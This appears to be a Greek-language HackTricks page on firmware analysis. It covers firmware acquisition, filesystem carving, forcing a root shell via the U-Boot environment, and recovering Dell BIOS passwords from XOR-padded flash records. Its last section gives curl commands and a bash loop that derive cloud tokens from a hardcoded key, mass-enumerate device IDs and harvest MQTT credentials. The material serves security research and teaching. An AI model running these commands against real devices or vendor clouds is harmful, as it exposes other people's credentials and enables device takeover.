# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Εισαγωγή**

### Σχετικοί πόροι

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των στοιχείων του hardware και του λογισμικού με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, εξασφαλίζοντας ότι η συσκευή έχει πρόσβαση σε ζωτικής σημασίας οδηγίες από τη στιγμή που ενεργοποιείται, ώστε να ξεκινήσει το λειτουργικό σύστημα. Η εξέταση και η ενδεχόμενη τροποποίηση του firmware αποτελούν κρίσιμο βήμα για τον εντοπισμό ευπαθειών ασφαλείας.<sup>[[2]](#references)[[3]](#references)</sup>

## **Συλλογή πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων σχετικά με:

- Την αρχιτεκτονική της CPU και το λειτουργικό σύστημα που εκτελεί
- Τα χαρακτηριστικά του bootloader
- Τη διάταξη του hardware και τα datasheets
- Μετρήσεις της βάσης κώδικα και τοποθεσίες του πηγαίου κώδικα
- Εξωτερικές βιβλιοθήκες και τύπους αδειών χρήσης
- Ιστορικό ενημερώσεων και ρυθμιστικές πιστοποιήσεις
- Αρχιτεκτονικά διαγράμματα και διαγράμματα ροής
- Αξιολογήσεις ασφαλείας και εντοπισμένες ευπάθειες

Για τον σκοπό αυτό, τα εργαλεία **open-source intelligence (OSINT)** είναι πολύτιμα, όπως και η ανάλυση τυχόν διαθέσιμων στοιχείων λογισμικού ανοιχτού κώδικα μέσω μη αυτόματων και αυτοματοποιημένων διαδικασιών ελέγχου. Εργαλεία όπως τα [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis που μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών προβλημάτων.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, καθένας με διαφορετικό βαθμό πολυπλοκότητας:

- **Απευθείας** από την πηγή (προγραμματιστές, κατασκευαστές)
- **Μεταγλωττίζοντάς το** σύμφωνα με τις παρεχόμενες οδηγίες
- **Κατεβάζοντάς το** από επίσημους ιστότοπους υποστήριξης
- Χρησιμοποιώντας ερωτήματα **Google dork** για τον εντοπισμό φιλοξενούμενων αρχείων firmware
- Αποκτώντας **απευθείας πρόσβαση σε cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Υποκλέπτοντας **ενημερώσεις** με τεχνικές man-in-the-middle
- **Εξάγοντάς το** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- **Παρακολουθώντας** αιτήματα ενημέρωσης στις επικοινωνίες της συσκευής
- Εντοπίζοντας και χρησιμοποιώντας **hardcoded endpoints ενημέρωσης**
- **Κάνοντας dump** από τον bootloader ή το δίκτυο
- **Αφαιρώντας και διαβάζοντας** το chip αποθήκευσης, όταν αποτύχουν όλες οι άλλες μέθοδοι, με τη χρήση κατάλληλων εργαλείων hardware

### Αρχεία καταγραφής μόνο μέσω UART: επιβολή root shell μέσω του περιβάλλοντος U-Boot στη flash

Αν αγνοείται το UART RX (μόνο αρχεία καταγραφής), μπορείτε και πάλι να επιβάλετε ένα init shell **επεξεργαζόμενοι το blob περιβάλλοντος του U-Boot εκτός σύνδεσης**:<sup>[[6]](#references)</sup>

1. Κάντε dump της SPI flash με ένα SOIC-8 clip και programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Εντοπίστε το partition του U-Boot env, επεξεργαστείτε το `bootargs` ώστε να συμπεριλάβει το `init=/bin/sh` και **υπολογίστε ξανά το U-Boot env CRC32** για το blob.
3. Κάντε reflash μόνο στο env partition και επανεκκινήστε· θα πρέπει να εμφανιστεί ένα shell στο UART.

Αυτό είναι χρήσιμο σε embedded συσκευές όπου το shell του bootloader είναι απενεργοποιημένο, αλλά το partition του env είναι εγγράψιμο μέσω εξωτερικής πρόσβασης στη flash.

## Ανάλυση του firmware

Τώρα που **έχετε το firmware**, πρέπει να εξαγάγετε πληροφορίες από αυτό, για να γνωρίζετε πώς να το χειριστείτε. Μερικά εργαλεία που μπορείτε να χρησιμοποιήσετε γι' αυτό:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Αν δεν εντοπίσετε πολλά με αυτά τα εργαλεία, ελέγξτε την **εντροπία** της εικόνας με `binwalk -E <bin>`. Αν η εντροπία είναι χαμηλή, πιθανότατα δεν είναι κρυπτογραφημένη. Αν είναι υψηλή, πιθανότατα είναι κρυπτογραφημένη (ή συμπιεσμένη με κάποιον τρόπο).

Επιπλέον, μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να εξαγάγετε **αρχεία ενσωματωμένα στο firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσετε το αρχείο.

### Διαφορική ανάλυση flash και ανακτήσιμες αποθήκες μυστικών XOR

Όταν μια ρύθμιση firmware δεν έχει τεκμηριωμένη μορφή αποθήκευσης, αρχικά λάβετε αρκετά αντίστοιχα dumps flash, αλλάξτε **ακριβώς μία** ρύθμιση, κάντε ξανά dump ολόκληρου του chip και συγκρίνετε τις μετατοπίσεις. Επαναλαμβάνοντας το πείραμα με ελεγχόμενες τιμές, μπορείτε να ξεχωρίσετε τη ρύθμιση από τους μετρητές και τα metadata εγγραφής· οι αλλαγές σε νέες μετατοπίσεις αντί για επιτόπου υποδεικνύουν αποθήκευση μόνο με προσθήκη ή δομή τύπου log. Διατηρήστε τις διαγραμμένες εγγραφές ή όσες έχουν σημειωθεί ως διαγραμμένες, καθώς τα byte των δεδομένων τους ενδέχεται να είναι ακόμη ανακτήσιμα.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Αφού εντοπίσετε την περιοχή, εξαγάγετε τα modules του firmware με εργαλεία όπως το `binwalk` και κάντε reverse engineering του writer/validator στο Ghidra. Επιβεβαιώστε στον κώδικα τα όρια των πεδίων, το padding, το indexing των κλειδιών και την παραγωγή των κλειδιών, αντί να συμπεραίνετε το σχήμα μόνο από μοτίβα στο ciphertext.<sup>[[12]](#references)</sup>

#### Ανάκτηση κλειδιών από κρυπτογραφημένο padding μηδενικών

Όπως περιγράφεται στην ενότητα [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), το γνωστό plaintext αποκαλύπτει bytes του keystream στις ίδιες θέσεις. Ένα πεδίο σταθερού μεγέθους είναι ιδιαίτερα εκτεθειμένο όταν το padding μηδενικών του καλύπτει κάθε θέση ενός επαναλαμβανόμενου XOR key: το κρυπτογραφημένο padding αποκαλύπτει απευθείας αυτά τα bytes του κλειδιού, επειδή `0x00 XOR key_byte = key_byte`. Αν καλύπτονται όλες οι θέσεις του κλειδιού, ανασυνθέστε το κλειδί από το τέλος του ciphertext και αποκρυπτογραφήστε τα bytes που περιέχουν δεδομένα.<sup>[[12]](#references)</sup>

Η ευάλωτη μορφή κωδικού πρόσβασης BIOS DVAR της Dell είναι ένα συγκεκριμένο παράδειγμα: το byte `0` ενός πεδίου 32 bytes είναι σε plaintext, ενώ τα bytes `1..31` χρησιμοποιούν ένα επαναλαμβανόμενο κλειδί 20 bytes.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Για μήκος κωδικού πρόσβασης `L`, οι θέσεις `L..31` ήταν μηδενικές πριν από το XOR. Όταν `L <= 12`, αυτές οι θέσεις καλύπτουν κάθε δείκτη κλειδιού, οπότε ανακτώνται το πλήρες κλειδί και ο κωδικός πρόσβασης χωρίς brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Ανάκτηση κλειδιών από ιστορικές εγγραφές

Μην αναλύετε κάθε εγγραφή ανεξάρτητα. Το κλειδί DVAR προκύπτει κατά προσέγγιση ως `modified_md5(device_seed || variable_GUID || password[0])`: το device seed και το GUID είναι σταθερά, και η μόνη είσοδος που εξαρτάται από τον κωδικό πρόσβασης είναι το πρώτο byte σε καθαρό κείμενο. Έτσι, προκύπτουν το πολύ 256 κλειδιά ανά συσκευή, και οι εγγραφές που ξεκινούν με το ίδιο byte μοιράζονται ένα κλειδί. Ομαδοποιήστε τις ενεργές και διαγραμμένες εγγραφές με βάση αυτό το byte· μια σύντομη ιστορική εγγραφή μπορεί να leak ολόκληρο το κλειδί μέσω του padding και να αποκρυπτογραφήσει μια τρέχουσα, μεγαλύτερη εγγραφή, της οποίας το padding από μόνο του δεν επαρκεί. Επομένως, η αλλαγή κωδικού πρόσβασης μπορεί να αυξήσει την έκθεση, όταν το παλιό ciphertext επισημαίνεται ως διαγραμμένο αντί να διαγραφεί.<sup>[[12]](#references)</sup>

Το εργαλείο [`dellpwn`](https://github.com/R3n5k1/dellpwn) εντοπίζει DVAR, επικυρώνει υποψήφιες εγγραφές, ανακτά κωδικούς πρόσβασης και μπορεί να εμφανίσει ακατέργαστα αποθηκευμένα bytes και bytes κλειδιών. Δημιουργήστε το από ένα checkout και σαρώστε μια επαληθευμένη εικόνα flash ως εξής:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Για προσαρμοσμένους parsers, απορρίψτε τα false positives ελέγχοντας τη δομή των εγγραφών, τους περιορισμούς στους εκτυπώσιμους χαρακτήρες, τα μηδενικά padding, την εντροπία του κλειδιού και τη συνέπεια όταν το κλειδί επαναλαμβάνεται. Αν επαναλαμβανόμενα dumps δείχνουν αραιές αναστροφές bit ανά εγγραφή, καταγράψτε τις μάσκες που παρατηρήθηκαν και ταξινομήστε τις διορθώσεις με βάση αυτούς τους περιορισμούς, αλλά αναφέρετε τους αμφίσημους χαρακτήρες αντί να παρουσιάζετε ευρετικά αποτελέσματα ως ακριβή ανάκτηση.<sup>[[12]](#references)</sup>

Τα password verifiers θα πρέπει να αποθηκεύουν ένα hash μονής κατεύθυνσης με salt και επαναλήψεις, αντί για αντιστρέψιμο ciphertext, ενώ τα stores με δομή καταγραφής θα πρέπει να αφαιρούν με ασφάλεια τα παρωχημένα μυστικά δεδομένα.<sup>[[12]](#references)</sup>

### Ανάκτηση του συστήματος αρχείων

Με τα εργαλεία που αναφέρθηκαν προηγουμένως, όπως `binwalk -ev <bin>`, θα έπρεπε να έχετε καταφέρει να **εξαγάγετε το σύστημα αρχείων**.\
Το Binwalk συνήθως το εξάγει σε έναν **φάκελο με όνομα τον τύπο του συστήματος αρχείων**, που συνήθως είναι ένας από τους εξής: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Χειροκίνητη εξαγωγή συστήματος αρχείων

Μερικές φορές, το binwalk **δεν θα έχει το magic byte του συστήματος αρχείων στις υπογραφές του**. Σε αυτές τις περιπτώσεις, χρησιμοποιήστε το binwalk για να **εντοπίσετε το offset του συστήματος αρχείων και να κάνετε carve στο συμπιεσμένο σύστημα αρχείων** από το binary και **να εξαγάγετε χειροκίνητα** το σύστημα αρχείων ανάλογα με τον τύπο του, ακολουθώντας τα παρακάτω βήματα.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Εκτελέστε την ακόλουθη **εντολή dd** για carving του filesystem Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Εναλλακτικά, μπορεί να εκτελεστεί και η ακόλουθη εντολή.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (που χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Στη συνέχεια, τα αρχεία θα βρίσκονται στον κατάλογο "`squashfs-root`".

- Αρχεία αρχειοθήκης CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για συστήματα αρχείων jffs2

`$ jefferson rootfsfile.jffs2`

- Για συστήματα αρχείων ubifs με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Ανακατασκευή τμηματοποιημένων ενσωματωμένων συστημάτων αρχείων root

Αν ένα ακατέργαστο dump eMMC/SSD περιέχει έγκυρη κεφαλίδα συστήματος αρχείων, αλλά οι μετατοπίσεις των μεταδεδομένων του εκτείνονται πέρα από τα όρια της ονομαστικής κατάτμησης, μην το χαρακτηρίσετε αμέσως ως κατεστραμμένο. Ο ενσωματωμένος κώδικας εκκίνησης μπορεί να συνθέσει την πραγματική συσκευή root από πολλαπλές φυσικές περιοχές χρησιμοποιώντας το Device Mapper, οπότε το carving μίας κατάτμησης GPT εξάγει μόνο το πρώτο τμήμα.<sup>[[9]](#references)</sup>

#### Αρχική διαλογή ολόκληρης της εικόνας μέσου

Πρώτα, επιβεβαιώστε ότι η απόκτηση έχει ολοκληρωθεί, το μέγεθος είναι σταθερό και καμία διεργασία εγγραφής δεν χρησιμοποιεί πλέον την εικόνα. Αν το όνομα αρχείου κωδικοποιεί διεύθυνση έναρξης/λήξης, συγκρίνετε αυτό το εύρος με τον πραγματικό αριθμό byte. Ανακτήστε το GPT σε λειτουργία μόνο για ανάγνωση και προσαρτήστε μόνο το απαιτούμενο εύρος· **μην** εκτελέσετε `vgchange -ay` σε μη έμπιστο φυσικό τόμο στον σταθμό εργασίας, επειδή μπορεί να προκύψουν συγκρούσεις ομάδων τόμων και ακούσιες εγγραφές.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Προτιμήστε μια αναλώσιμη VM όταν η αρχική λογική init ή μια στοίβα LVM πρέπει να βλέπει ολόκληρο το image. Τα ιστορικά boot logs από ένα τυπικό boot partition είναι ιδιαίτερα χρήσιμα: ο bootloader μπορεί να έχει καταγράψει offsets proprietary-container, μήκη components, επιλογή slot, κανόνες ευθυγράμμισης και επαλήθευση υπογραφής. Χρησιμοποιήστε αυτές τις τιμές για να απομονώσετε μια ενσωματωμένη command line/kernel/initramfs και, στη συνέχεια, επικυρώστε ανεξάρτητα κάθε αποτέλεσμα με τα `file`, magic bytes και `binwalk`· η ανάγνωση μέχρι το τέλος του container μπορεί κατά λάθος να προσθέσει ένα initrd, ένα αντικείμενο ACPI ή μια υπογραφή στον kernel.<sup>[[9]](#references)</sup>

#### Ανάκτηση του block map κατά την εκκίνηση

Εξαγάγετε το initramfs του kernel και κάντε reverse το `/init` μαζί με τυχόν storage libraries. Στο [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), ακολουθήστε τις αναφορές συμβολοσειρών για τα `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` και τα paths των partitions· στη συνέχεια, εντοπίστε τον κώδικα που επιλέγει το ενεργό A/B slot και δημιουργεί τον πίνακα. Χρήσιμα σημεία εκκίνησης στο radare2 είναι τα `r2 -A init`, `afl`, `pdf @ main` και `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ο στόχος `linear` αντιστοιχίζει διαδοχικές περιοχές μιας εικονικής συσκευής σε περιοχές μίας ή περισσότερων backing devices. Ένας ανακτημένος πίνακας δύο segments έχει συνήθως την εξής μορφή (όλες οι θέσεις και τα μήκη είναι σε sectors των 512 byte):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Αναπαράγετε ακριβώς τις αριθμητικές πράξεις του machine code, συμπεριλαμβανομένων του πλάτους των ακεραίων, των μετατοπίσεων και των μετατροπών μονάδων. Για παράδειγμα, η παρακάτω έκφραση στρογγυλοποιεί προς τα κάτω ένα μέγεθος σε byte σε όριο 4 KiB και μόνο τότε το μετατρέπει σε τομείς των 512 byte· αν την αντικαταστήσετε με `p4_bytes // 512`, η επιλεγμένη ουρά μετατοπίζεται κατά `p4_bytes % 4096` όποτε το διαμέρισμα δεν είναι ευθυγραμμισμένο σε όριο σελίδας.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Ανακατασκευάστε μια επίπεδη εικόνα ανάλυσης αντιγράφοντας τα εύρη με τη σειρά του πίνακα, σε περιορισμένα τμήματα, αντί να φορτώσετε ολόκληρο το dump των μέσων αποθήκευσης στη μνήμη. Έτσι αποφεύγετε επίσης τη δημιουργία συσκευών mapper στην πλευρά του host. Διατηρήστε τα offsets που προκύπτουν από το GPT, τις ανεστραμμένες καταμετρήσεις τομέων και το μήκος του παραγόμενου αρχείου ως ξεχωριστές assertions.<sup>[[9]](#references)</sup>

#### Διακρίνετε την αλλοίωση από ένα σταθερό σφάλμα ανακατασκευής

Για το SquashFS, ελέγξτε το magic `hsqs` και αποκωδικοποιήστε το πεδίο `bytes_used` των 64 bit σε little-endian, στο offset 40 του superblock, πριν εκτελέσετε το `unsquashfs`. Αν η εξαγωγή αποτύχει σε αρκετές άσχετες μεταξύ τους δομές, αναζητήστε σε ένα ευρύ παράθυρο γύρω από τις αναμενόμενες θέσεις και απαιτήστε ισχυρούς δομικούς υποψηφίους: ένα block μεταδεδομένων που αποσυμπιέζεται, αρκετές διαδοχικές έγκυρες εγγραφές καταλόγου, εύλογα πεδία inode, ένα root inode συμβατό με τον αριθμό των inode ή έγκυρη δομή μεταδεδομένων ακεραιότητας. Μία μόνο αντιστοιχία magic δεν αρκεί.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Όταν η ίδια προσημασμένη διαφορά καθιστά έγκυρες ανεξάρτητες δομές —για παράδειγμα, τα metadata καταλόγου και μια εγγραφή verity— η πιθανότερη αιτία είναι συστηματικό σφάλμα στην αρχή του τμήματος και όχι byte που λείπουν. Επανεξετάστε τους αντίστροφους υπολογισμούς και αναζητήστε υπόλοιπα που απορρίφθηκαν, ζητήματα προσημασμένων/μη προσημασμένων τιμών, υπερχείλιση ή στρογγυλοποίηση σε τομείς/σελίδες, προτού επιχειρήσετε ανάκτηση orphan ή επιδιόρθωση των metadata του filesystem.<sup>[[9]](#references)</sup>

Τέλος, διατηρήστε ξεχωριστά τα όρια προστασίας: οι τόμοι LUKS που είναι σφραγισμένοι με TPM προστατεύουν την εμπιστευτικότητα των δεδομένων, ενώ μια υπογεγραμμένη αντιστοίχιση dm-verity προστατεύει την ακεραιότητα του root filesystem. Ένα software TPM δεν ανακτά ένα κλειδί που έχει σφραγιστεί στο αρχικό φυσικό TPM, ενώ η εκκίνηση ενός τροποποιημένου SquashFS μέσω ενός init μόνο για ερευνητική χρήση, το οποίο παραλείπει την επαλήθευση verity, δεν πλαστογραφεί την υπογραφή του ούτε παραβιάζει το dm-verity.<sup>[[9]](#references)</sup>

## Ανάλυση Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να το εξετάσετε για να κατανοήσετε τη δομή του και τις πιθανές ευπάθειές του. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από την εικόνα firmware.

### Εργαλεία αρχικής ανάλυσης

Παρατίθεται ένα σύνολο εντολών για την αρχική επιθεώρηση του δυαδικού αρχείου (που αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στον εντοπισμό τύπων αρχείων, στην εξαγωγή συμβολοσειρών, στην ανάλυση δυαδικών δεδομένων και στην κατανόηση των λεπτομερειών των κατατμήσεων και των filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Για να αξιολογηθεί η κατάσταση κρυπτογράφησης του image, ελέγχεται η **εντροπία** με `binwalk -E <bin>`. Η χαμηλή εντροπία υποδηλώνει έλλειψη κρυπτογράφησης, ενώ η υψηλή εντροπία υποδηλώνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **ενσωματωμένων αρχείων**, συνιστώνται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για την επιθεώρηση αρχείων.

### Εξαγωγή του Filesystem

Με τη χρήση του `binwalk -ev <bin>`, συνήθως μπορεί να εξαχθεί το filesystem, συχνά σε έναν κατάλογο με όνομα που αντιστοιχεί στον τύπο του filesystem (π.χ., squashfs, ubifs). Ωστόσο, όταν το **binwalk** δεν αναγνωρίζει τον τύπο του filesystem λόγω απουσίας magic bytes, απαιτείται μη αυτόματη εξαγωγή. Σε αυτήν την περίπτωση, χρησιμοποιείται το `binwalk` για τον εντοπισμό του offset του filesystem και στη συνέχεια η εντολή `dd` για την αποκοπή του filesystem:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ., squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή των περιεχομένων.

### Ανάλυση filesystem

Αφού εξαχθεί το filesystem, ξεκινά η αναζήτηση για ευπάθειες ασφαλείας. Ελέγχονται μη ασφαλείς network daemons, hardcoded διαπιστευτήρια, API endpoints, λειτουργίες server ενημερώσεων, μη μεταγλωττισμένος κώδικας, scripts εκκίνησης και compiled binaries για offline ανάλυση.

**Βασικές τοποθεσίες** και **στοιχεία** προς έλεγχο:

- Τα **etc/shadow** και **etc/passwd** για διαπιστευτήρια χρηστών
- Πιστοποιητικά και κλειδιά SSL στο **etc/ssl**
- Αρχεία ρυθμίσεων και scripts για πιθανές ευπάθειες
- Embedded binaries για περαιτέρω ανάλυση
- Συνήθεις web servers και binaries συσκευών IoT

Διάφορα εργαλεία βοηθούν στον εντοπισμό ευαίσθητων πληροφοριών και ευπαθειών μέσα στο filesystem:

- Τα [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση ευαίσθητων πληροφοριών
- Το [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για ολοκληρωμένη ανάλυση firmware
- Τα [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) και [**EMBA**](https://github.com/e-m-b-a/emba) για στατική και δυναμική ανάλυση

### Έλεγχοι ασφαλείας σε compiled binaries

Τόσο ο πηγαίος κώδικας όσο και τα compiled binaries που βρίσκονται στο filesystem πρέπει να ελέγχονται σχολαστικά για ευπάθειες. Εργαλεία όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό binaries χωρίς προστασία, τα οποία θα μπορούσαν να γίνουν αντικείμενο εκμετάλλευσης.

## Συλλογή cloud config και διαπιστευτηρίων MQTT μέσω παραγόμενων URL tokens

Πολλά IoT hubs ανακτούν τη διαμόρφωση κάθε συσκευής από ένα cloud endpoint που έχει τη μορφή:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την ανάλυση firmware, μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID με χρήση ενός hardcoded μυστικού, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως κεφαλαίο hex

Αυτός ο σχεδιασμός επιτρέπει σε οποιονδήποτε γνωρίζει ένα deviceId και το STATIC_KEY να ανασυνθέσει το URL και να ανακτήσει το cloud config, αποκαλύπτοντας συχνά διαπιστευτήρια MQTT σε απλό κείμενο και προθέματα topics.

Πρακτική διαδικασία:

1) Εξαγωγή του deviceId από τα UART boot logs

- Συνδέστε έναν προσαρμογέα UART 3.3V (TX/RX/GND) και καταγράψτε τα logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Αναζητήστε γραμμές που εμφανίζουν το μοτίβο URL της cloud config και τη διεύθυνση του broker, για παράδειγμα:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Ανάκτηση του STATIC_KEY και του αλγορίθμου token από το firmware

- Φόρτωσε τα δυαδικά αρχεία στο Ghidra/radare2 και αναζήτησε τη διαδρομή config ("/pf/") ή τη χρήση του MD5.
- Επιβεβαίωσε τον αλγόριθμο (π.χ., MD5(deviceId||STATIC_KEY)).
- Παράγαγε το token στο Bash και μετέτρεψε το digest σε κεφαλαία:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Συλλογή cloud config και διαπιστευτηρίων MQTT

- Συνθέστε το URL και ανακτήστε το JSON με curl· αναλύστε το με jq για να εξαγάγετε τα μυστικά:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Εκμεταλλευτείτε MQTT σε απλό κείμενο και αδύναμα ACLs θεμάτων (αν υπάρχουν)

- Χρησιμοποιήστε τα διαπιστευτήρια που ανακτήθηκαν για να κάνετε subscribe σε θέματα συντήρησης και να αναζητήσετε ευαίσθητα συμβάντα:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Απαριθμήστε προβλέψιμα αναγνωριστικά συσκευών (σε μεγάλη κλίμακα, με εξουσιοδότηση)

- Πολλά οικοσυστήματα ενσωματώνουν bytes OUI/προϊόντος/τύπου κατασκευαστή, ακολουθούμενα από ένα διαδοχικό επίθημα.
- Μπορείτε να δοκιμάσετε διαδοχικά υποψήφια αναγνωριστικά, να παράγετε tokens και να ανακτάτε configs μέσω προγραμματισμού:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Σημειώσεις
- Να λαμβάνετε πάντα ρητή εξουσιοδότηση πριν επιχειρήσετε μαζική enumeration.
- Όπου είναι δυνατό, προτιμήστε emulation ή στατική ανάλυση για την ανάκτηση secrets χωρίς τροποποίηση του hardware-στόχου.

